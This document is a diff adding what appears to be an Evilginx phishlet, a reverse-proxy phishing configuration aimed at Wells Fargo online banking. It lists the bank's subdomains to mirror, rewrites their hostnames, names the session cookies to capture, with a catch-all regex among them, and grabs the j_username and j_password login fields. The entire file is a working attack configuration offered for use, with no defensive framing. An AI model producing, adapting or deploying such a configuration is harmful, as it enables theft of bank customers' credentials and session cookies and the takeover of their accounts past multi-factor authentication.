@@ -1,0 +1,65 @@
+author: "@EvilWhale"
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'wellsfargo.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'wellsfargo.com', session: false, is_landing:false, auto_filter: false}
+  - {phish_sub: 'www17', orig_sub: 'www17', domain: 'wellsfargomedia.com', session: false, is_landing:false, auto_filter: false}
+  - {phish_sub: 'c1', orig_sub: 'c1', domain: 'wfinterface.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'connect.secure', orig_sub: 'connect.secure', domain: 'wellsfargo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'okra', orig_sub: 'okra', domain: 'wf.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'pdx-col', orig_sub: 'pdx-col', domain: 'eum-appdynamics.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'online', orig_sub: 'online', domain: 'wellsfargo.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'stories', orig_sub: 'stories', domain: 'wf.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'connect.secure.wellsfargo.com', orig_sub: 'www', domain: 'wellsfargo.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'connect.secure.wellsfargo.com', orig_sub: 'static', domain: 'wellsfargo.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'connect.secure.wellsfargo.com', orig_sub: 'www17', domain: 'wellsfargomedia.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'connect.secure.wellsfargo.com', orig_sub: 'c1', domain: 'wfinterface.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'connect.secure.wellsfargo.com', orig_sub: 'connect.secure', domain: 'wellsfargo.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'connect.secure.wellsfargo.com', orig_sub: 'okra', domain: 'wf.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'connect.secure.wellsfargo.com', orig_sub: 'pdx-col', domain: 'eum-appdynamics.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'connect.secure.wellsfargo.com', orig_sub: 'online', domain: 'wellsfargo.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wellsfargo.com', orig_sub: 'www', domain: 'wellsfargo.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wellsfargo.com', orig_sub: 'static', domain: 'wellsfargo.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wellsfargo.com', orig_sub: 'www17', domain: 'wellsfargomedia.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wellsfargo.com', orig_sub: 'c1', domain: 'wfinterface.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wellsfargo.com', orig_sub: 'connect.secure', domain: 'wellsfargo.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wellsfargo.com', orig_sub: 'okra', domain: 'wf.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wellsfargo.com', orig_sub: 'pdx-col', domain: 'eum-appdynamics.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wellsfargo.com', orig_sub: 'online', domain: 'wellsfargo.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stories.wf.com', orig_sub: 'stories', domain: 'wf.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.wellsfargo.com'
+    keys: ['0f60-928b', '2749-a782','4860-e8e7','4bfc-585a', '4e3a-9f81','6fef-0703', '824e-74e8','8772-93e6','sajssdk_2015_cross_new_user', 'utag_main','TC_PRIVACY_CENTER', '_ga','_ga_0W6DM1HXWY','_ga_1PVHF651F1', '_ga_7JXJJ2JF12','_ga_98K30SHWB2','_ga_T2RL1TPDC7', '_gcl_au','_gid','_hjSessionUser_1490990', '_hjSessionUser_278703','_hjSessionUser_2790284','_parsely_visitor', '_rdt_uuid','_ym_d','__ssid', '_abck','_cls_v','.*,regexp']
+    type: 'cookie'
+  - domain: 'connect.secure.wellsfargo.com'
+    keys: ['0f60-928b', '2749-a782','4860-e8e7','4bfc-585a', '4e3a-9f81','6fef-0703', '824e-74e8','8772-93e6','sajssdk_2015_cross_new_user', 'utag_main','TC_PRIVACY_CENTER', '_ga','_ga_0W6DM1HXWY','_ga_1PVHF651F1', '_ga_7JXJJ2JF12','_ga_98K30SHWB2','_ga_T2RL1TPDC7', '_gcl_au','_gid','_hjSessionUser_1490990', '_hjSessionUser_278703','_hjSessionUser_2790284','_parsely_visitor', '_rdt_uuid','_ym_d','__ssid', '_abck','_cls_v','.*,regexp']
+    type: 'cookie'
+  - domain: '.static.wellsfargo.com'
+    keys: ['0f60-928b', '2749-a782','4860-e8e7','4bfc-585a', '4e3a-9f81','6fef-0703', '824e-74e8','8772-93e6','sajssdk_2015_cross_new_user', 'utag_main','TC_PRIVACY_CENTER', '_ga','_ga_0W6DM1HXWY','_ga_1PVHF651F1', '_ga_7JXJJ2JF12','_ga_98K30SHWB2','_ga_T2RL1TPDC7', '_gcl_au','_gid','_hjSessionUser_1490990', '_hjSessionUser_278703','_hjSessionUser_2790284','_parsely_visitor', '_rdt_uuid','_ym_d','__ssid', '_abck','_cls_v','.*,regexp']
+    type: 'cookie'
+  - domain: 'gbxreport-prod.wf.com'
+    keys: ['0f60-928b', '2749-a782','4860-e8e7','4bfc-585a', '4e3a-9f81','6fef-0703', '824e-74e8','8772-93e6','sajssdk_2015_cross_new_user', 'utag_main','TC_PRIVACY_CENTER', '_ga','_ga_0W6DM1HXWY','_ga_1PVHF651F1', '_ga_7JXJJ2JF12','_ga_98K30SHWB2','_ga_T2RL1TPDC7', '_gcl_au','_gid','_hjSessionUser_1490990', '_hjSessionUser_278703','_hjSessionUser_2790284','_parsely_visitor', '_rdt_uuid','_ym_d','__ssid', '_abck','_cls_v','.*,regexp']
+    type: 'cookie'
+
+auth_urls:
+  - '/auth/login/present'
+  - '/'
+
+credentials:
+  username:
+    key: 'j_username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'j_password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.wellsfargo.com'
+  path: '/'
+
